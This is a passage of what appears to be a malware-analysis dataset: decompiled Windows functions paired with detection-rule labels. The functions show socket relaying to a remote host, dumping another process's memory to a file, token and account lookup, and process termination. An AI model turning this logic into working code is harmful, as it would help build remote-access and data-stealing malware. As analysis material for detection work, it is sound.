  uStackY4372 = 0x47ff76;\n                    fcn.00403af4();\n                    uStackY4372 = 0x47ff89;\n                    iVar7 = (**(*piVar3 + 0xc))();\n                    if (iVar7 == 0) break;\n                    sub.wsock32.dll_send();\n                    uStackY4372 = 0x47ffb9;\n                    iVar2 = var_4h;\n                    sub.wsock32.dll_recv();\n                    if ((iVar7 == 0) || (*(iVar1 + 0xd) != '\\0')) break;\n                }\n                *in_FS_OFFSET = iVar2;\n                uStackY4372 = 0x47ffdd;\n                sub.gdi32.dll_SelectObject();\n                uStackY4376 = 0x47ffe6;\n                uStackY4372 = uVar5;\n                sub.gdi32.dll_DeleteObject();\n                uStackY4380 = 0x47ffef;\n                uStackY4376 = uVar6;\n                sub.gdi32.dll_DeleteObject();\n                uStackY4384 = 0;\n                uStackY4388 = 0x47fffa;\n                uStackY4380 = uVar4;\n                sub.user32.dll_ReleaseDC();\n                return;\n            }\n        }\n    }\ncode_r0x00480002:\n    if (var_8h != 0) {\n        uStack4200 = 0x480010;\n        fcn.0040f94c();\n    }\n    if (var_ch != 0) {\n        uStack4200 = 0x48001e;\n        fcn.0040f94c();\n    }\n    uStack4200 = 2;\n    puStack4204 = var_4h;\n    iStack4208 = 0x480029;\n    sub.wsock32.dll_shutdown();\n    iStack4208 = var_4h;\n    uStack4212 = 0x480032;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = iStack4208;\n    uStack4200 = 0x480057;\n    puStack4204 = 0x48004f;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1761
    },
    "004800f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004800f0(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack1180;\n    int32_t iStack1176;\n    uchar *puStack1172;\n    int32_t iStack1116;\n    int32_t iStack1092;\n    uint uStack1088;\n    uchar *puStack1084;\n    uint var_428h;\n    uint var_424h;\n    uint var_420h;\n    uint name;\n    uint var_40ch;\n    int32_t *var_ch;\n    int32_t s;\n    uint var_4h;\n    \n    puStack1084 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack1088 = 0x480323;\n    iStack1092 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbbc;\n    puVar1 = &stack0xfffffffc;\n    if ((*(in_EAX + 0x44) == 0) && (s = sub.wsock32.dll_socket(),  puVar1 = puStack1084,  s != -1)) {\n        sub.wsock32.dll_htons();\n        iVar2 = sub.wsock32.dll_inet_addr();\n        if (iVar2 == -1) {\n            iStack1116 = **0x495b34;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            puVar1 = puStack1084;\n            if (iVar2 == 0) goto code_r0x004802fd;\n        }\n        sub.wsock32.dll_connect();\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            fcn.00409d78();\n            fcn.00405864();\n            fcn.00475e38();\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                var_ch = fcn.00404620();\n                puStack1172 = 0x480232;\n                fcn.0041b750(0, 0);\n                iStack1176 = 0x4802e2;\n                iStack1180 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffb64;\n                puStack1172 = &stack0xfffffffc;\n                while( true ) {\n                    fcn.00403af4();\n                    iVar2 = sub.wsock32.dll_recv(s, &fcn.004800f0::var_40ch, 0x400, 0);\n                    if (iVar2 < 1) break;\n                    (**(*var_ch + 0x10))();\n                    puStack1172 = 0x400;\n                    iStack1176 = &fcn.004800f0::var_40ch + 1;\n                    iStack1180 = s;\n                    sub.wsock32.dll_send();\n                }\n                iVar2 = 0;\n                fcn.0041b750(0, 0);\n                fcn.0048d63c();\n                fcn.0046163c();\n                fcn.00476010();\n                fcn.0040f94c();\n                *in_FS_OFFSET = iVar2;\n                fcn.00404650(0x4802e9);\n                return;\n            }\n        }\n        sub.wsock32.dll_shutdown();\n        iStack1116 = s;\n        sub.wsock32.dll_closesocket();\n        puVar1 = puStack1084;\n    }\ncode_r0x004802fd:\n    puStack1084 = puVar1;\n    *in_FS_OFFSET = iStack1116;\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 818
    },
    "004804cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048088f)\n\nvoid fcn.004804cc(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_FS_OFFSET;\n    int64_t iVar5;\n    uchar auStackY8220 [3608];\n    uint uStackY4612;\n    uchar *puStackY4604;\n    uint uStackY4600;\n    uint uStackY4596;\n    uint uStackY4592;\n    uint uStackY4588;\n    uint uStackY4584;\n    uint *puStack4540;\n    int32_t iStack4516;\n    uint *puStack4512;\n    uint *arg_8h;\n    uchar *puStack4472;\n    uint uStack4468;\n    uchar *puStack4464;\n    uchar *puStack4456;\n    uint uStack4452;\n    uint uStack4448;\n    uint uStack4444;\n    int32_t var_18h;\n    uint var_14h;\n    uint s;\n    int32_t len;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = 2;\n    do {\n        var_8h = iVar3;\n        iVar3 = var_8h + -1;\n    } while (var_8h + -1 != 0);\n    var_4h = 0;\n    puStack4512 = 0x4808ec;\n    iStack4516 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffee5c;\n    if ((*(var_8h + 0x48) == 0) && (puVar2 = sub.wsock32.dll_socket(),  puVar2 != 0xffffffff)) {\n        sub.wsock32.dll_htons();\n        iVar3 = sub.wsock32.dll_inet_addr();\n        if (iVar3 == -1) {\n            puStack4540 = **0x495b34;\n            iVar3 = sub.wsock32.dll_gethostbyname();\n            if (iVar3 == 0) goto code_r0x004808c6;\n        }\n        sub.wsock32.dll_connect();\n        iVar3 = sub.wsock32.dll_recv();\n        if (iVar3 != -1) {\n            uVar4 = fcn.00480960();\n            uStackY4584 = 0x4805e8;\n            fcn.00409e64(uVar4);\n            uStackY4584 = 0;\n            uStackY4588 = 0x48091c;\n            uStackY4592 = 0x480604;\n            fcn.00409d78();\n            uStackY4592 = 0;\n            uStackY4596 = 0x48061a;\n            fcn.004058e0();\n            uStackY4596 = 0x480628;\n            fcn.00475e38();\n            uStackY4596 = 0;\n            uStackY4600 = 0x2000;\n            puStackY4604 = &stack0xffffdfe4;\n            uStackY4612 = 0x48063f;\n            iVar3 = sub.wsock32.dll_recv();\n            if (iVar3 != -1) {\n                uStackY4612 = 0x480651;\n                var_18h = (**(**(var_8h + 0x40) + 0x14))();\n                if (-1 < var_18h + -1) {\n                    while( true ) {\n                        iStack4516 = 0x480676;\n                        (**(**(var_8h + 0x40) + 0xc))();\n                        uVar4 = fcn.004803ac();\n                        uStack4444 = 0x48069b;\n                        fcn.00409e64(uVar4);\n                        uStack4444 = 0;\n                        uStack4448 = 0x4806b1;\n                        fcn.004058e0();\n                        uStack4448 = 0x4806bf;\n                        fcn.00475ed4();\n                        uStack4448 = 0;\n                        uStack4452 = 0x2000;\n                        puStack4456 = &stack0xffffdfe4;\n                        puStack4464 = 0x4806d6;\n                        puStack4512 = puVar2;\n                        iVar3 = sub.wsock32.dll_recv();\n                        if (iVar3 == -1) break;\n                        puStack4464 = 0x4806e5;\n                        cVar1 = fcn.0040a274();\n                        if (cVar1 == '\\0') {\ncode_r0x00480702:\n                            puStack4464 = 0x48070f;\n                            fcn.00475ed4();\n                            puStack4464 = NULL;\n                            uStack4468 = 0x2000;\n                            puStack4472 = &stack0xffffdfe4;\n                            puStack4512 = puVar2;\n                            iVar3 = sub.wsock32.dll_recv();\n                        }\n                        else {\n                            puStack4464 = 0x4806f4;\n                            iVar5 = fcn.004803ac();\n                            if (iVar5 >> 0x20 == 0) {\n                                if (iVar5 == 0) goto code_r0x00480702;\n                            }\n                            else if (iVar5 < 0x100000000) goto code_r0x00480702;\n                            uStack4468 = 0x4807f3;\n                            puStack4472 = *in_FS_OFFSET;\n                            *in_FS_OFFSET = &stack0xffffee88;\n                            puStack4464 = &stack0xfffffffc;\n                            fcn.00403770();\n                            **0x495bd8 = 0;\n                            fcn.00403e68();\n                            while( true ) {\n                                fcn.00403af4();\n                                arg_8h = &fcn.004804cc::len;\n                                fcn.004038d8(arg_8h);\n                                if ((len < 1) || (arg_8h = puVar2,  iVar3 = sub.wsock32.dll_send(),  iVar3 == -1))\n                                break;\n                                puStack4512 = 0x4807ca;\n                                arg_8h = puVar2;\n                                iVar3 = sub.wsock32.dll_recv();\n                                if ((iVar3 == -1) || (len == 0)) break;\n                            }\n                            puStack4512 = 0x4807e2;\n                            fcn.00403918();\n                            puStack4512 = 0x4807e7;\n                            fcn.0040305c();\n                            *in_FS_OFFSET = arg_8h;\n                            fcn.00475ed4();\n                            iStack4516 = 0x480858;\n                            puStack4512 = puVar2;\n                            iVar3 = sub.wsock32.dll_recv();\n                        }\n                        if ((iVar3 == -1) || (var_18h = var_18h + -1,  var_18h == 0)) break;\n                    }\n                }\n                iStack4516 = 0x480874;\n                fcn.00475ed4();\n                iStack4516 = 0;\n                sub.wsock32.dll_recv();\n            }\n        }\n        sub.wsock32.dll_shutdown();\n        sub.wsock32.dll_closesocket();\n        fcn.0040f94c();\n        fcn.0041fec4();\n        puStack4540 = puVar2;\n    }\ncode_r0x004808c6:\n    *in_FS_OFFSET = puStack4540;\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1679
    },
    "00480b50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00480b50(void)\n\n{\n    bool bVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uchar uVar5;\n    uchar auStackY8212 [8100];\n    uint uStackY112;\n    uchar *puStackY104;\n    uint uStackY100;\n    uint uStackY96;\n    int32_t iStack64;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint s;\n    \n    puStack32 = &stack0xfffffffc;\n    iVar4 = 0x431;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    uStack36 = 0x480f56;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    bVar1 = false;\n    puVar2 = &stack0xfffffffc;\n    if ((*(in_EAX + 0x48) == 0) && (iVar4 = sub.wsock32.dll_socket(),  puVar2 = puStack32,  iVar4 != -1)) {\n        sub.wsock32.dll_htons();\n        iVar3 = sub.wsock32.dll_inet_addr();\n        if (iVar3 == -1) {\n            iStack64 = **0x495b34;\n            iVar3 = sub.wsock32.dll_gethostbyname();\n            puVar2 = puStack32;\n            if (iVar3 == 0) goto code_r0x00480f0b;\n        }\n        sub.wsock32.dll_connect();\n        uStackY96 = 0x480c18;\n        iVar3 = sub.wsock32.dll_recv();\n        if (iVar3 != -1) {\n            uStackY96 = 0x480c2d;\n            fcn.00409d78();\n            uStackY96 = 0x480c43;\n            fcn.00405864();\n            uStackY96 = 0x480c51;\n            fcn.00475e38();\n            uStackY96 = 0;\n            uStackY100 = 0x2000;\n            puStackY104 = &stack0xffffdfec;\n            uStackY112 = 0x480c68;\n            iVar3 = sub.wsock32.dll_recv();\n            if (iVar3 != -1) {\n                while (*(in_EAX + 0xd) == '\\0') {\n                    fcn.00403af4();\n                    iVar3 = sub.wsock32.dll_recv();\n                    uVar5 = iVar3 == 0;\n                    if ((iVar3 < 1) && (uVar5 = *(in_EAX + 0x40) == '\\0',  uVar5)) {\n                        fcn.0041fec4();\n                        break;\n                    }\n                    fcn.00405e3c();\n                    fcn.00409bd8();\n                    fcn.004057d4();\n                    fcn.00405a44();\n                    fcn.00405974();\n                    if (uVar5) {\n                        fcn.00405a84();\n                        fcn.00405b28();\n                        fcn.00405a44();\n                        fcn.00405b28();\n                        fcn.00405a84();\n                        fcn.004055c8();\n                        fcn.00405864();\n                        fcn.00403770();\n                        **0x495bd8 = 1;\n                        fcn.00403e84();\n                        fcn.0040305c();\n                        bVar1 = true;\n                        fcn.00480b30(&stack0xfffffffc);\n                    }\n                    else {\n                        fcn.00405a44();\n                        fcn.00405974();\n                        if (uVar5) {\n                            fcn.00405a84();\n                            if (bVar1) {\n                                fcn.00403918();\n                                fcn.0040305c();\n                            }\n                            bVar1 = false;\n                            fcn.00480b30(&stack0xfffffffc);\n                        }\n                        else {\n                            fcn.00405a44();\n                            fcn.00405974();\n                            if (uVar5) {\n                                *(in_EAX + 0x40) = 1;\n                                sub.wsock32.dll_shutdown();\n                                uStackY96 = 0x480e5e;\n                                sub.wsock32.dll_closesocket();\n                                uStackY96 = 0x480e65;\n                                fcn.0041fec4();\n                                break;\n                            }\n                            fcn.00405a44();\n                            fcn.00405974();\n                            if (uVar5) {\n                                if (bVar1) {\n                                    fcn.00403918();\n                                    fcn.0040305c();\n                                }\n                                bVar1 = false;\n                                fcn.00480b30(&stack0xfffffffc);\n                            }\n                            else {\n                                fcn.004038f8(0);\n                                fcn.0040305c();\n                                uStackY96 = 0x480ed1;\n                                fcn.00480b30(&stack0xfffffffc);\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        if (bVar1) {\n            fcn.00403918();\n            fcn.0040305c();\n        }\n        sub.wsock32.dll_shutdown();\n        sub.wsock32.dll_closesocket();\n        fcn.0041fec4();\n        iStack64 = iVar4;\n        puVar2 = puStack32;\n    }\ncode_r0x00480f0b:\n    puStack32 = puVar2;\n    *in_FS_OFFSET = iStack64;\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1313
    },
    "00482e04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00482e04 noreturn (int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack44 = 0x482e23;\n    fcn.00405fe8();\n    uStack48 = 0x482efe;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x482ec9;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack44 = &stack0xfffffffc;\n    fcn.00408568();\n    fcn.004055c8();\n    iVar1 = *(arg_8h + 4);\n    if (iVar1 <= *(arg_8h + 8)) {\n        iVar2 = (*(arg_8h + 8) - iVar1) + 1;\n        var_14h = iVar1;\n        do {\n            if (**0x495a78 == '\\0') {\n    // WARNING: Subroutine does not return\n                sub.kernel32.dll_ExitThread_1(0);\n            }\n            iVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 8);\n            fcn.00405584();\n            *(iVar1 + 4) = var_14h;\n            sub.kernel32.dll_CreateThread_1(0, 0, fcn.00482c5c, iVar1, 0, &fcn.00482e04::var_18h);\n            uStack64 = 100;\n            sub.kernel32.dll_Sleep_2();\n            var_14h = var_14h + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 514
    },
    "00483104": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00483104(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uchar *puVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_24h = &stack0xfffffffc;\n    iVar2 = 6;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x4833a3;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00483104::var_20h;\n    if (*0x495788 != '\\x01') {\n        var_28h = 0x483357;\n        var_2ch = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00483104::var_2ch;\n        var_18h = &stack0xfffffffc;\n        var_14h = unaff_EDI;\n        var_10h = unaff_ESI;\n        fcn.00405530();\n        *0x495788 = 1;\n        *0x495784 = '\\0';\n        fcn.00473324();\n        fcn.0040ef4c(&fcn.00483104::var_24h, *0x4833b4);\n        fcn.004055c8();\n        fcn.00409b84();\n        fcn.004055c8();\n        piVar1 = fcn.00404620();\n        (**(*piVar1 + 0x2c))();\n        do {\n            (**(*piVar1 + 0xc))();\n            (**(*piVar1 + 0x48))();\n            fcn.00405b28(&fcn.00483104::var_10h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.00405b28(&fcn.00483104::var_14h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.00405b28(&fcn.00483104::var_18h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.004055c8();\n            iVar2 = 0;\n            do {\n                uVar9 = 0x4833d4;\n                uVar7 = 0x4833d4;\n                uVar5 = 0x4833d4;\n                uVar4 = 0;\n                iVar3 = iVar2;\n                puVar6 = var_18h;\n                uVar8 = var_14h;\n                uVar10 = var_10h;\n                fcn.00409e64(iVar2);\n                fcn.004058e0(var_2ch, iVar3, uVar4, uVar5, puVar6, uVar7, uVar8, uVar9, uVar10);\n                sub.kernel32.dll_CreateThread_1(0, 0, fcn.00482fac, &fcn.00483104::var_4h, 0, &fcn.00483104::var_20h);\n                sub.kernel32.dll_Sleep_2();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0x100);\n            iVar2 = (**(*piVar1 + 0x14))();\n        } while (iVar2 != 0);\n        uVar8 = 0x4833e0;\n        fcn.004058e0(0x4833e0, var_18h, 0x4833d4, var_14h, 0x4833d4, var_10h);\n        while (*0x495784 == '\\0') {\n            uVar8 = 100;\n            sub.kernel32.dll_Sleep_2();\n        }\n        fcn.00405864();\n        fcn.00475d98();\n        *in_FS_OFFSET = uVar8;\n        *in_FS_OFFSET = var_14h;\n        fcn.00405554(0x4833aa);\n        fcn.00405554();\n        return;\n    }\n    var_24h = NULL;\n    // WARNING: Subroutine does not return\n    var_28h = 0x48337b;\n    sub.kernel32.dll_ExitThread_1();\n}\n",
        "token_count": 1192
    },
    "004846ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004846ec noreturn (uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar6;\n    uint uVar7;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    puStack84 = 0x484714;\n    fcn.00405fe8();\n    uStack88 = 0x48493e;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    var_20h = 0;\n    var_28h = 0;\n    var_2ch = 0;\n    uStack96 = 0x484740;\n    puStack84 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_30h = 0;\n    uStack96 = 0x48474d;\n    fcn.00405530();\n    uStack96 = 0x48475c;\n    fcn.00408568();\n    arg_8h_00 = *arg_8h;\n    uVar4 = arg_8h[1];\n    uVar1 = arg_8h[2];\n    uVar2 = arg_8h[3];\n    uStack96 = 0x484778;\n    fcn.004055c8();\n    if (uVar1 == uVar4) {\n        uStack96 = 0x48478b;\n        fcn.00475d98();\n        uStack96 = 0;\n    // WARNING: Subroutine does not return\n        uStack100 = 0x484792;\n        sub.kernel32.dll_ExitThread_1();\n    }\n    uStack100 = 0;\n    uStack104 = 0x10;\n    puStack108 = 0x48479f;\n    uStack96 = arg_8h_00;\n    var_24h = sub.kernel32.dll_OpenProcess();\n    if (var_24h != 0) {\n        uStack112 = 0x4848f8;\n        iStack116 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff8c;\n        puStack108 = &stack0xfffffffc;\n        iVar3 = fcn.004059dc(0x40000000, 0, 0, 4, 0, 0);\n        var_20h = sub.kernel32.dll_CreateFileA_1();\n        if (var_20h != -1) {\n            fcn.00406928(uVar2);\n            for (; uVar4 < uVar1; uVar4 = uVar4 + uVar5) {\n                uVar5 = uVar2;\n                if (uVar1 - uVar4 < uVar2) {\n                    uVar5 = uVar1 - uVar4;\n                }\n                sub.kernel32.dll_VirtualProtectEx(var_24h, uVar4, uVar5, 4, &fcn.004846ec::var_30h);\n                sub.kernel32.dll_ReadProcessMemory(var_24h, uVar4, var_4h, uVar5, &fcn.004846ec::var_28h);\n                sub.kernel32.dll_VirtualProtectEx(var_24h, uVar4, uVar5, var_30h, &fcn.004846ec::var_30h);\n                iVar3 = var_20h;\n                sub.kernel32.dll_WriteFile_1();\n            }\n            *in_FS_OFFSET = iVar3;\n            fcn.00406934(0x4848ff);\n            sub.kernel32.dll_SetEndOfFile_1(var_20h);\n            sub.kernel32.dll_CloseHandle_1(var_20h);\n            sub.kernel32.dll_CloseHandle_1(var_24h);\n            uVar7 = 0x4849e8;\n            uVar6 = 0;\n            fcn.00409e64(arg_8h_00);\n            fcn.004058e0(0x484a28, var_8h, 0x484a08, 0, arg_8h_00, uVar6, uVar7);\n            fcn.00475d98();\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        fcn.00475d98();\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    puStack108 = 0x4847b2;\n    fcn.00475d98();\n    puStack108 = NULL;\n    // WARNING: Subroutine does not return\n    uStack112 = 0x4847b9;\n    sub.kernel32.dll_ExitThread_1();\n}\n",
        "token_count": 1228
    },
    "00484bb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00484bb4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    bool bVar4;\n    int32_t iStackY176;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint *TokenInformation;\n    uint TokenInformationLength;\n    uint TokenHandle;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x484d51;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack68;\n    var_5h = 0;\n    iVar1 = sub.kernel32.dll_OpenProcess(0x400, 0);\n    if (iVar1 != 0) {\n        iVar2 = sub.advapi32.dll_OpenProcessToken(iVar1, 8, &TokenHandle);\n        if (iVar2 != 0) {\n            uVar3 = TokenHandle;\n            iVar2 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 1, 0, 0, &TokenInformationLength);\n            TokenInformation = NULL;\n            while (bVar4 = iVar2 == 0,  bVar4) {\n                iVar2 = sub.kernel32.dll_GetLastError_1();\n                if (iVar2 != 0x7a) break;\n                fcn.00402f34();\n                uVar3 = TokenHandle;\n                iVar2 = sub.advapi32.dll_GetTokenInformation();\n            }\n            sub.kernel32.dll_CloseHandle_1(TokenHandle, uVar3);\n            if (bVar4) goto code_r0x00484d36;\n            var_1ch = 0;\n            var_20h = 0;\n            sub.advapi32.dll_LookupAccountSidA(0, *TokenInformation, 0, &var_1ch, 0, &var_20h, &var_18h);\n            if ((var_1ch != 0) && (var_20h != 0)) {\n                fcn.00405c6c();\n                fcn.00405c6c();\n                uVar3 = fcn.004059dc(&var_20h, &var_18h);\n                uVar3 = fcn.004059dc(&var_1ch, uVar3);\n                iVar2 = sub.advapi32.dll_LookupAccountSidA(0, *TokenInformation, uVar3);\n                if (iVar2 != 0) {\n                    var_5h = 1;\n                    fcn.004059dc();\n                    fcn.0040aab0();\n                    fcn.00405584();\n                    fcn.004059dc();\n                    fcn.0040aab0();\n                    fcn.00405584();\n                }\n            }\n            if (!bVar4) {\n                fcn.00402f1c();\n            }\n        }\n        sub.kernel32.dll_CloseHandle_1();\n        iStackY176 = iVar1;\n    }\ncode_r0x00484d36:\n    *in_FS_OFFSET = iStackY176;\n    fcn.00405554(0x484d58);\n    return;\n}\n",
        "token_count": 743
    },
    "00484e64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00484e64(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iVar1;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t hProcess;\n    uint lpExitCode;\n    \n    uStack20 = 0;\n    uStack24 = 1;\n    puStack28 = 0x484e74;\n    hProcess = sub.kernel32.dll_OpenProcess();\n    if (hProcess != 0) {\n        uStack32 = 0x484ebc;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        sub.kernel32.dll_GetExitCodeProcess(hProcess, &fcn.00484e64::lpExitCode);\n        iVar1 = hProcess;\n        sub.kernel32.dll_TerminateProcess(hProcess, lpExitCode);\n        *in_FS_OFFSET = iVar1;\n        sub.kernel32.dll_CloseHandle_1(hProcess, 0x484ec3);\n        return;\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "00484ec8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
